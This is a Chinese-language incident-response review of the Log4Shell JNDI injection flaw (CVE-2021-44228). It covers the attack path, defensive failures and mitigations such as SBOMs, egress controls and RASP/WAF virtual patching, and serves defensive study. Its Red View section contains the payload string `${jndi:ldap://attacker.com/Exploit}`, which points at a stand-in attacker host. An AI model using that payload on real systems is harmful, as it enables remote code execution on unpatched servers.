# Log4j2 远程代码执行漏洞 (Log4Shell) 应急响应复盘

- **所属领域**: 信息安全 (Infosec)
- **威胁类型**: 供应链安全 / 远程代码执行 (RCE)
- **事件回顾**: 2021年12月，Apache Log4j2 被曝存在严重的 JNDI 注入漏洞（CVE-2021-44228）。由于该组件在全球 Java 应用中极其普遍，且利用方式极简（仅需一行字符串），导致全球互联网资产面临毁灭性威胁，被称为“核弹级漏洞”。

## Red View (利用路径)
1. **JNDI 注入**: 攻击者通过构造 `${jndi:ldap://attacker.com/Exploit}` 字符串，利用 Log4j2 对日志中占位符的动态解析特性。
2. **无限制解析**: 默认配置下开启了 Lookup 功能，允许从远程服务器下载并执行恶意的 Java 类文件。
3. **横向移动**: 一旦攻破入口 Web 服务，由于内部系统大量信任该组件，攻击者可以迅速在内网扩散。

## Blue View (防御缺失)
1. **组件清单 (SBOM) 缺失**: 漏洞爆发初期，大量企业根本不清楚自己的哪些系统引用了 Log4j2（直接引用或间接依赖）。
2. **外网出向控制不严**: 受害服务器允许随意连接外部恶意 LDAP 服务器，未能通过出口防火墙阻断异常流量。
3. **应急响应机制缓慢**: 依赖于手工打补丁，缺乏自动化的虚拟补丁 (WAF/RASP) 快速阻断能力。

## 策略借鉴
1. **纵深防御 (Defense in Depth)**: 不能仅靠补丁。应通过 RASP (运行时自防护) 监控异常的方法调用。
2. **SBOM 管理**: 建立完整的软件物料清单，实现漏洞爆发后的秒级受影响资产定位。
3. **出口黑白名单**: 严格限制生产环境服务器的主动出连请求，特别是非常规协议 (LDAP, RMI)。
4. **虚拟补丁机制**: 建立 WAF 层面的关键词阻断 + RASP 层面的逻辑阻断，为核心系统升级争取“缓冲时间”。
